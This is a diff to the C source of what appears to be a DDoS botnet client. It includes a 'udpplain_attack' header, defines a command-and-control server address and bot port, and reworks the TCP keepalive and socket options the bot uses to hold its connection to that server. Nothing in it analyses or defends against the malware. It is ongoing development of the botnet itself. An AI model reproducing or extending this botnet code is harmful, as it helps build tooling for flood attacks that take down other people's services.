@@ -30,8 +30,8 @@
 #include "headers/connection_lock.h"
 #include "headers/udpplain_attack.h"
 
-#define CNC_IP "127.0.0.1"
-#define BOT_PORT 1334
+#define CNC_IP "0.0.0.0"
+#define BOT_PORT 1150
 #define MAX_THREADS 15
 #define RETRY_DELAY 2
 #define RECV_TIMEOUT_MS 12000
@@ -352,23 +352,43 @@ int main(int argc __attribute__((unused)), char** argv __attribute__((unused))) 
         timeout.tv_sec = 30;
         timeout.tv_usec = 0;
 
-        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
-        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
-        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
-        
-        int keepidle = 5;
-        int keepintvl = 3;
-        int keepcnt = 3;
-        int tcp_retries = 10;
-        int mss = 1448;
-        
+        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
+        }
+        if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
+        }
+        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) {
+        }
+        if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)) < 0) {
+        }
+
+        #ifdef TCP_KEEPIDLE
+        int keepidle = 30;
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
+        #endif
+
+        #ifdef TCP_KEEPINTVL
+        int keepintvl = 5;
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
+        #endif
+
+        #ifdef TCP_KEEPCNT
+        int keepcnt = 5;
         setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
+        #endif
+
+        #ifdef TCP_SYNCNT
+        int tcp_retries = 10;
         setsockopt(sock, IPPROTO_TCP, TCP_SYNCNT, &tcp_retries, sizeof(tcp_retries));
+        #endif
+
+        #ifdef TCP_MAXSEG
+        int mss = 1448;
         setsockopt(sock, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
+        #endif
+
+        #ifdef TCP_NODELAY
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
+        #endif
         
         int sndbuf = 65535;
         int rcvbuf = 65535;
